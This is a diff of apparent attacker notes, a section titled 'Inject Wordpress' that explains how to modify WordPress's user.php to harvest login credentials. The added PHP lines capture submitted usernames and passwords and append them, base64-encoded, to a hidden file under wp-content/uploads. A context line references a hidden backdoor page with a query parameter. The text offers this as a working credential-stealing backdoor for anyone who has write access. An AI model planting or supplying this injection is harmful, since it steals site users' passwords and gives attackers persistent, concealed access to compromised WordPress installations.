@@ -18,18 +18,14 @@ example.com/uploads/.page.backup.php?dxnboy=4343
 ### Inject Wordpress
 
 Inject user.php in wordpress to record credentials that login. Required user priviledge that can write to wordpress directory. 
-edit file wordpress/wp-include/user.php
-before
+edit file wordpress/wp-include/user.php.
 
+before
 ```
 if ( ! empty( $credentials['remember'] ) ) {
                 $credentials['remember'] = true;
-                $credz = date('Y-m-d') . "Username: " . $_POST['log'] . " && Password: " . $_POST['pwd'];
-                file_put_contents('wp-content/uploads/.page.php.swp', base64_encode($credz).PHP_EOL, FILE_APPEND);
 } else {
                 $credentials['remember'] = false;
-                $credz = date('Y-m-d') . "Username: " . $_POST['log'] . " && Password: " . $_POST['pwd'];
-                file_put_contents('wp-content/uploads/.page.php.swp', base64_encode($credz).PHP_EOL, FILE_APPEND);
 }
 ```
 
@@ -37,8 +33,12 @@ after inject
 ```
 if ( ! empty( $credentials['remember'] ) ) {
                 $credentials['remember'] = true;
+                $credz = date('Y-m-d') . "Username: " . $_POST['log'] . " && Password: " . $_POST['pwd'];
+                file_put_contents('wp-content/uploads/.page.php.swp', base64_encode($credz).PHP_EOL, FILE_APPEND);
 } else {
                 $credentials['remember'] = false;
+                $credz = date('Y-m-d') . "Username: " . $_POST['log'] . " && Password: " . $_POST['pwd'];
+                file_put_contents('wp-content/uploads/.page.php.swp', base64_encode($credz).PHP_EOL, FILE_APPEND);
 }
 ```
 
